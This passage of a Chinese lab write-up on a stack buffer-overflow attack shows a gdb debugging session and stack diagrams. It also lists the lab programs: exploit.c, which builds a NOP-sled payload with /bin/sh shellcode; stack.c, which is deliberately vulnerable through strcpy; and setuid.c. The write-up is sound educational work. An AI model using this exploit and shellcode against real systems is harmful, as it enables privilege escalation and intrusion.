class="variable">$esp</span></span><br><span class="line">Cannot access memory at address 0xffffffffffffddf0</span><br><span class="line">(gdb) <span class="built_in">print</span> badfile</span><br><span class="line"><span class="variable">$3</span> = (FILE *) 0x0</span><br><span class="line">(gdb) p &amp;str</span><br><span class="line"><span class="variable">$4</span> = (char (*)[517]) 0x7fffffffde10</span><br><span class="line">(gdb) pstr</span><br><span class="line">Undefined <span class="built_in">command</span>: <span class="string">&quot;pstr&quot;</span>.  Try <span class="string">&quot;help&quot;</span>.</span><br><span class="line">(gdb) p str</span><br><span class="line"><span class="variable">$5</span> = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 17 <span class="built_in">times</span>&gt;, <span class="string">&quot;\377\000\000\000\000\000\000\377\000\000\000\000\000\000\000\000\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span></span><br><span class="line">&lt;repeats 183 <span class="built_in">times</span>&gt;...</span><br><span class="line">(gdb) step</span><br><span class="line">21              <span class="built_in">printf</span>(<span class="string">&quot;str addr (%p)\n&quot;</span>, str);</span><br><span class="line">(gdb) p <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$6</span> = -8160</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$7</span> = 0xffffe020</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$8</span> = 0xffffddf0</span><br><span class="line">(gdb) p buffer</span><br><span class="line">No symbol <span class="string">&quot;buffer&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) p badfile</span><br><span class="line"><span class="variable">$9</span> = (FILE *) 0x0</span><br><span class="line">(gdb) step</span><br><span class="line">str addr (0x7fffffffde10)</span><br><span class="line">23          badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">(gdb) p badfile</span><br><span class="line"><span class="variable">$10</span> = (FILE *) 0x0</span><br><span class="line">(gdb) step</span><br><span class="line">24          fread(str, sizeof(char), 517, badfile);</span><br><span class="line">(gdb) p badfile</span><br><span class="line"><span class="variable">$11</span> = (FILE *) 0x602420</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$12</span> = 0xffffddf0</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$13</span> = 0xffffe020</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7a7b1b0 <span class="keyword">in</span> fread () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">(gdb) p badfile</span><br><span class="line">No symbol <span class="string">&quot;badfile&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) p <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$14</span> = -8160</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$15</span> = 0xffffe020</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, bof (</span><br><span class="line">    str=0x7fffffffde10 <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span>, <span class="string">&#x27;\220&#x27;</span> &lt;repeats 100 <span class="built_in">times</span>&gt;...) at stack.c:11</span><br><span class="line">11      int bof(char *str) &#123;</span><br><span class="line">(gdb) p badfile</span><br><span class="line">No symbol <span class="string">&quot;badfile&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) p str</span><br><span class="line"><span class="variable">$16</span> = 0x7fffffffde10 <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span>, <span class="string">&#x27;\220&#x27;</span> &lt;repeats 100 <span class="built_in">times</span>&gt;...</span><br><span class="line">(gdb) p &amp;str</span><br><span class="line"><span class="variable">$17</span> = (char **) 0x7fffffffddb8</span><br><span class="line">(gdb) p <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$18</span> = -8736</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$19</span> = 0xffffdde0</span><br><span class="line">(gdb) p /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$20</span> = 0xffffddb0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">buffer addr (0x7fffffffddc0)</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x00007ffff7ab2a50 <span class="keyword">in</span> ?? () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">(gdb) p <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$21</span> = -8792</span><br><span class="line">(gdb) p /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$22</span> = 0xffffdda8</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$23</span> = 0xffffdde0</span><br><span class="line">(gdb) p buffer</span><br><span class="line">No symbol <span class="string">&quot;buffer&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) p str</span><br><span class="line">No symbol <span class="string">&quot;str&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 4, bof (</span><br><span class="line">    str=0x7fffffffde10 <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span>, <span class="string">&#x27;\220&#x27;</span> &lt;repeats 180 <span class="built_in">times</span>&gt;...) at stack.c:16</span><br><span class="line">16          <span class="built_in">return</span> 1;</span><br><span class="line">(gdb) p buffer</span><br><span class="line"><span class="variable">$24</span> = <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span></span><br><span class="line">(gdb) p &amp;buffer</span><br><span class="line"><span class="variable">$25</span> = (char (*)[24]) 0x7fffffffddc0</span><br><span class="line">(gdb) p str</span><br><span class="line"><span class="variable">$26</span> = 0x7fffffffde10 <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span>, <span class="string">&#x27;\220&#x27;</span> &lt;repeats 180 <span class="built_in">times</span>&gt;...</span><br><span class="line">(gdb) p &amp;str</span><br><span class="line"><span class="variable">$27</span> = (char **) 0x7fffffffddb8</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$28</span> = 0xffffdde0</span><br><span class="line">(gdb) p /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$29</span> = 0xffffddb0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">*** stack smashing detected ***: /home/lyq/Desktop/hw1_cp/stackdbg terminated</span><br><span class="line"></span><br><span class="line">Program received signal SIGABRT, Aborted.</span><br><span class="line">0x00007ffff7a42438 <span class="keyword">in</span> raise () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">(gdb) p /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$30</span> = 0xffffda58</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$31</span> = 0xffffdd70</span><br><span class="line">(gdb) p badfile</span><br><span class="line">No symbol <span class="string">&quot;badfile&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program terminated with signal SIGABRT, Aborted.</span><br><span class="line">The program no longer exists.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>通过观察gdb中输出的结果，我们可以看到在各个关键时刻，memory中的%ebp帧指针和各参数的位置与值。</p>
+</li>
+<li><p>但是我们同时也可以看到，我们未能成功地运行完成这个程序，<strong>中途由于buffer overflow，我们的程序已经跳转，在gdb的调试过程中，出现了Program terminated with signal SIGABRT, Aborted.信息，提前终止了程序</strong>（应该是出现了segment fault）。</p>
+</li>
+</ul>
+<h3 id="3-各关键时刻的栈示意图"><a href="#3-各关键时刻的栈示意图" class="headerlink" title="3. 各关键时刻的栈示意图"></a>3. 各关键时刻的栈示意图</h3><p>为了便于形象深刻地理解上述各个过程，我制作了各个关键环节中，memory中的栈区的状态示意图，并将gdb调试中显示的各个变量，地址，寄存器的值标了上去。</p>
+<h5 id="正常运行阶段："><a href="#正常运行阶段：" class="headerlink" title="正常运行阶段："></a>正常运行阶段：</h5><ul>
+<li>以下示意图是程序还未被恶意攻击前正常执行的代码：</li>
+</ul>
+<h6 id="main-call-fread后，fread-ret前："><a href="#main-call-fread后，fread-ret前：" class="headerlink" title="main call fread后，fread ret前："></a>main call fread后，fread ret前：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695767349-16497336117853.png" alt="uTools_1649695767349"></p>
+<h6 id="main-call-bof-前："><a href="#main-call-bof-前：" class="headerlink" title="main call bof 前："></a>main call bof 前：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695798228-16497336117854.png" alt="uTools_1649695798228"></p>
+<h6 id="main-call-bof后，bof-call-strcpy前："><a href="#main-call-bof后，bof-call-strcpy前：" class="headerlink" title="main call bof后，bof call strcpy前："></a>main call bof后，bof call strcpy前：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695847388-16497336117855.png" alt="uTools_1649695847388"></p>
+<h6 id="main-call-bof后，bof-call-strpy后，strcpy运行中："><a href="#main-call-bof后，bof-call-strpy后，strcpy运行中：" class="headerlink" title="main call bof后，bof call strpy后，strcpy运行中："></a>main call bof后，bof call strpy后，strcpy运行中：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695888297-16497336117856.png" alt="uTools_1649695888297"></p>
+<h5 id="buffer-overflow导致问题出现的阶段"><a href="#buffer-overflow导致问题出现的阶段" class="headerlink" title="buffer overflow导致问题出现的阶段"></a>buffer overflow导致问题出现的阶段</h5><ul>
+<li>在下面这个阶段，由于strcpy代码的执行，buffer overflow攻击的影响造成了严重后果，原本的bof函数的return address被替换，造成了严重的恶意代码执行问题。</li>
+<li>另外，这里的表示有一些问题，<strong>理论上溢出的信息一共只有517byte，是肯定不会覆盖到main中str[BUFFER_SIZE]之上的部分的</strong>，<strong>但是</strong>由于<strong>将溢出的这部分内容划分的比较大一些可以便于观察</strong>，于是我选择在这方面不严谨些。</li>
+</ul>
+<h6 id="main-call-bof后，bof-call-strpy后，strcpy完成复制字符串工作，但并未return："><a href="#main-call-bof后，bof-call-strpy后，strcpy完成复制字符串工作，但并未return：" class="headerlink" title="main call bof后，bof call strpy后，strcpy完成复制字符串工作，但并未return："></a>main call bof后，bof call strpy后，strcpy完成复制字符串工作，但并未return：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732930514.png" alt="uTools_1649732930514"></p>
+<h6 id="main-call-bof后，bof-call-strpy后，且strcpy返回后："><a href="#main-call-bof后，bof-call-strpy后，且strcpy返回后：" class="headerlink" title="main call bof后，bof call strpy后，且strcpy返回后："></a>main call bof后，bof call strpy后，且strcpy返回后：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732962431.png" alt="uTools_1649732962431"></p>
+<h6 id="bof-return-后（没有返回main而是被定位到了恶意代码位置0xffff1d76）："><a href="#bof-return-后（没有返回main而是被定位到了恶意代码位置0xffff1d76）：" class="headerlink" title="bof return 后（没有返回main而是被定位到了恶意代码位置0xffff1d76）："></a>bof return 后（没有返回main而是被定位到了恶意代码位置0xffff1d76）：</h6><p>在此之后，程序从0xffff1d76开始向高地址方向当作代码进行执行，最终执行到恶意代码</p>
+<p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732973365.png" alt="uTools_1649732973365"></p>
+<h5 id="如果正常运行，应该经历的阶段"><a href="#如果正常运行，应该经历的阶段" class="headerlink" title="如果正常运行，应该经历的阶段"></a>如果正常运行，应该经历的阶段</h5><ul>
+<li>由于buffer overflow的原因，下面本该正常出现的状态最后没有发生，我还是选择将这些状态记录在下面。</li>
+</ul>
+<h6 id="（由于buffer-overflow，实际未发生）main-call-bof后，bof-leave后ret前："><a href="#（由于buffer-overflow，实际未发生）main-call-bof后，bof-leave后ret前：" class="headerlink" title="（由于buffer overflow，实际未发生）main call bof后，bof leave后ret前："></a>（由于buffer overflow，实际未发生）main call bof后，bof leave后ret前：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695859172-16497336117857.png" alt="uTools_1649695859172"></p>
+<h6 id="（由于buffer-overflow实际未发生）bof-ret后："><a href="#（由于buffer-overflow实际未发生）bof-ret后：" class="headerlink" title="（由于buffer overflow实际未发生）bof ret后："></a>（由于buffer overflow实际未发生）bof ret后：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695866837-16497336117858.png" alt="uTools_1649695866837"></p>
+<h5 id="附：实验所用程序集合"><a href="#附：实验所用程序集合" class="headerlink" title="附：实验所用程序集合"></a>附：实验所用程序集合</h5><ol>
+<li>exploit.c 生成可以利用缓冲区漏洞进行攻击的badfile文件</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* exploit.c */</span></span><br><span class="line"><span class="comment">/* A program that creates a file &quot;badfile&quot; containing code for launching shell */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET 400 <span class="comment">// Represent the offset from buffer</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode[]数组中存储了我们利用buffer overflow漏洞想要执行的恶意代码</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line">  <span class="string">&quot;\x31\xc0&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe3&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x53&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe1&quot;</span></span><br><span class="line">  <span class="string">&quot;\x99&quot;</span></span><br><span class="line">  <span class="string">&quot;\xb0\x0b&quot;</span></span><br><span class="line">  <span class="string">&quot;\xcd\x80&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">//fillBuffer函数将shellcode[]数组中的恶意代码放在了函数fillBuffer的最后</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fillBuffer</span><span class="params">(<span class="keyword">char</span> buffer[BUFFER_SIZE])</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Get the size of the shellcode</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeSize = <span class="keyword">sizeof</span>(shellcode);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent an estimate return address that will eventually allow shellcode to be executed</span></span><br><span class="line">  <span class="comment">// by using the address of the buffer and an offset value (400 bytes after the buffer in this case)</span></span><br><span class="line">  <span class="keyword">long</span> *returnAddress = (<span class="keyword">long</span> *) (buffer+OFFSET);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get a long integer pointer of the buffer to reference each 4-bytes hexadecimal in a stack memory address</span></span><br><span class="line">  <span class="keyword">long</span> *bufferPtr = (<span class="keyword">long</span> *) buffer;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent index for the &quot;for&quot; loop</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get the starting index of the null-terminated shellcode in the buffer</span></span><br><span class="line">  <span class="comment">// (i.e. null-terminated shellcode is inserted at the end of the buffer)</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeStartIndex = (BUFFER_SIZE-(shellcodeSize+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent counter for the shellcode</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeCounter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Loop 25 times (each time modifying the 4-bytes hexadecimal in the stack memory address starting from the buffer)</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">    *bufferPtr = (<span class="keyword">long</span>) returnAddress; <span class="comment">// Assign the estimate return address to a 4-bytes hexadecimal in the stack memory address</span></span><br><span class="line">    bufferPtr++; <span class="comment">// Go to the next 4-bytes hexadecimal in the stack memory address (because long integer is 4-bytes portion)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Insert shellcode (without null-termination) at the end of the buffer</span></span><br><span class="line">  <span class="keyword">for</span> (i = shellcodeStartIndex; i &lt; (BUFFER_SIZE<span class="number">-1</span>); i++) &#123;</span><br><span class="line">    buffer[i] = shellcode[shellcodeCounter];</span><br><span class="line">    shellcodeCounter++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Null-terminate the shellcode</span></span><br><span class="line">  buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//	printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">  FILE *badfile;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize buffer with 0x90 (NOP instruction) */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0x90</span>, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* You need to fill the buffer with appropriate contents here */</span></span><br><span class="line">  fillBuffer(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Save the contents to the file &quot;badfile&quot; */</span></span><br><span class="line">  badfile = fopen(<span class="string">&quot;./badfile&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(buffer, BUFFER_SIZE, <span class="number">1</span>, badfile);</span><br><span class="line">  fclose(badfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol>
+<li>stack.c 有漏洞的C语言文件</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* stack.c */</span></span><br><span class="line"><span class="comment">/* This program has a buffer overflow vulnerability. */</span></span><br><span class="line"><span class="comment">/* Our task is to exploit this vulnerability */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bof</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">24</span>];</span><br><span class="line"><span class="comment">//	printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">    <span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//	printf(&quot;str addr (%p)\n&quot;, str);</span></span><br><span class="line">    FILE *badfile;</span><br><span class="line">    badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">    bof(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol>
+<li>setuid.c 利用漏洞开shell的示例文件</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>fireknight
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/" title="Buffer Overflow Attack ，part2：模拟实验">http://example.com/2022/04/12/Buffer-Overflow-Attack-，part2：模拟实验/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Buffer-Overflow-Attack/" rel="tag"><i class="fa fa-tag"></i> Buffer Overflow Attack</a>
+              <a href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag"><i class="fa fa-tag"></i> C语言</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/06/WebGoat-A1-Injection-SQL-Injection-intro-%E5%92%8C-SQL-Injection-advanced/" rel="prev" title="WebGoat  (A1)Injection SQL Injection(intro) 和 SQL Injection(advanced)">
+      <i class="fa fa-chevron-left"></i> WebGoat  (A1)Injection SQL Injection(intro) 和 SQL Injection(advanced)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
